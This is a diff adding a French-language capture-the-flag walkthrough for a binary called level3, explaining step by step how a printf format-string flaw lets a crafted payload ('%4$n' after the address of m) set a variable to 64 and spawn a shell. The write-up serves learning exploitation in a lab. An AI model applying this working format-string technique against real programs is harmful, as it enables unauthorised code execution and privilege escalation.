@@ -1,0 +1,10 @@
+1. Le dossier contient un executable, en le decompilant, on vois qu'il lance une fonction qui si la variable m est equivalente a 0x40 (64 en decimal) le programme lance un shell
+2. Il faut donc trouver le moyen de changer la valeur de m
+3. Avant le if, la fonction v lit avec un fgets, et ecris dans une variable qui est lu par un printf, cela va nous permettre de set la variable a 64
+4. Je recupere l'adresse avec gdb ``p &m``
+5. Je vais creer un payload que je vais envoyer en entree du programme source, et qui va permettre de changer la valeur de m grace au printf
+6. Pour cela il faut que je sache sur quel position de la stack ecris le printf, je lance cette commande ``echo "AAAA %x %x %x %x" | ./level3`` -> AAAA 200 b7fd1ac0 b7ff37d0 41414141 -> AAAA en hexa vaut 41414141 -> donc nous savons que printf ecris en position 4.
+7. (python -c "print('\x8c\x98\x04\x08' + 'A'*60 + '%4\$n')"; cat) | ./level3 -> voici mon payload finale qui me permet d'ecrire 64
+8. ``'A'*60`` -> permet d'afficher 60 caractere donc 60 caractere plus 4 caractere de l'adresse -> cela nous fais 64 caracteres en touts
+9. ``%4$n`` dit à printf d'écrire le nombre total de caractères déjà affichés (64) à l'adresse trouvée en 4ème position de la stack -> c'est-à-dire l'adresse de m, que nous avons placée là nous-mêmes en tête du payload
+10. Cette expression vas donc etre recuperer par le fgets, le printf affiche ensuite le contenu recuperer par fgets, donc l'adresse de m puis 60 caractere, puis grace a l'expression %4$n ecris le nombre de caractere precedement affiche dans l'adresse stocke en 4eme emplacement de la stack. La variable m vaut alors 64, ce qui rend valide la condition du if vue au point 1 et déclenche system("/bin/sh")
